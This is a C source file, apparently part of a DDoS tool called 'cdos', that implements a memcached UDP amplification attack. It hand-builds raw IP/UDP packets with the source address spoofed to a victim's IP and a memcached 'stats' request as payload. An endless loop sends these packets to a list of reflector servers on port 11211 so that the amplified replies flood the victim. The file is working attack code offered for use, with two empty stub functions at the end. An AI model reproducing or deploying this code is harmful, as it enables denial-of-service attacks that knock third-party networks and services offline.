//
//  memcrashed.c
//  cdos
//
//  Created by Andre Zay on 06.04.2018.
//  Copyright © 2018 Andre Zay. All rights reserved.
//

#include "memcrashed.h"
#include "socket.h"
#include "ddos.h"//configuration
#include "message.h"
#include "util.h"

#include <pthread.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>

#ifdef __APPLE__
#define iphdr ip
#endif


uint64_t MAX_PSIZE;

unsigned short csum (unsigned short *buf, int nwords)
{
    unsigned long sum = 0;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void init_ip(struct iphdr* iph,char* target){
#ifdef __APPLE__
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 0;
    iph->ip_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 15;
    iph->ip_id = htonl(54321);
    iph->ip_off = 0;
    iph->ip_ttl = MAXTTL;
    iph->ip_p = IPPROTO_UDP;
    iph->ip_sum = 0;
    struct in_addr s;
    s.s_addr=inet_addr(target);
    iph->ip_src = s;
#else
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 15;
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr(target);
#endif
}

void init_udp(struct udphdr *udph,int port){//port--target port
#ifdef __APPLE__
    udph->uh_sport=htons(port);
    udph->uh_dport=htons(11211);//memcached port
    udph->uh_sum=0;
    memcpy((void *)udph + sizeof(struct udphdr), "\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n", 15);
    udph->uh_ulen=htons(sizeof(struct udphdr) + 15);
#else
    udph->source = htons(port);
    udph->dest = htons(11211);
    udph->check = 0;
    memcpy((void *)udph + sizeof(struct udphdr), "\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n", 15);
    udph->len=htons(sizeof(struct udphdr) + 15);
#endif
}

void _memcrashed_ddos(char *target,int port,slist *hosts){
    char datagram[MAX_PSIZE];
    struct iphdr *iph = (struct iphdr*)datagram;
    struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin;
    sin.sin_family=AF_INET;
    struct in_addr _s;
    _s.s_addr=inet_addr(target);
    sin.sin_addr=_s;
    int sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(sock < 0){
        die("Failed to open socket!");
    }
    memset(datagram, 0, MAX_PSIZE);
    init_ip(iph, target);
    init_udp(udph, port);
#ifdef __APPLE__
    udph->uh_sport=randport();
#else
    udph->source=randport();
#endif
    _node* cur=nth_slist(hosts,randrange(0, (int)hosts->length));
    for(;;){//launch attack
        char* __ip=cur->val;
        in_addr_t _ip=inet_addr(__ip);
        struct sockaddr_in t;
        t.sin_family=AF_INET;
        t.sin_addr.s_addr=_ip;
#ifndef __APPLE__
        sendto(sock, datagram, iph->tot_len, 0, (struct sockaddr *) &t, sizeof(t));
#else
        sendto(sock, datagram, iph->ip_len, 0, (struct sockaddr *) &t, sizeof(t));
#endif
        cur=cur->next;
        struct in_addr _t;
        _t.s_addr=inet_addr(cur->val);
#ifdef __APPLE__
        iph->ip_dst=_t;
        iph->ip_id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->ip_sum = csum ((unsigned short *) datagram, iph->ip_len >> 1);
#else
        iph->daddr=_t;
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->check = csum ((unsigned short *) datagram, iph->ip_len >> 1);
#endif
        psent+=1;
        if(dos_sleep>0){
            sleep_ms(dos_sleep);
        }
    }
}
void memcrashed_ddos(_dos_param _p){
    
}
void memcrashed_status(){
    
}
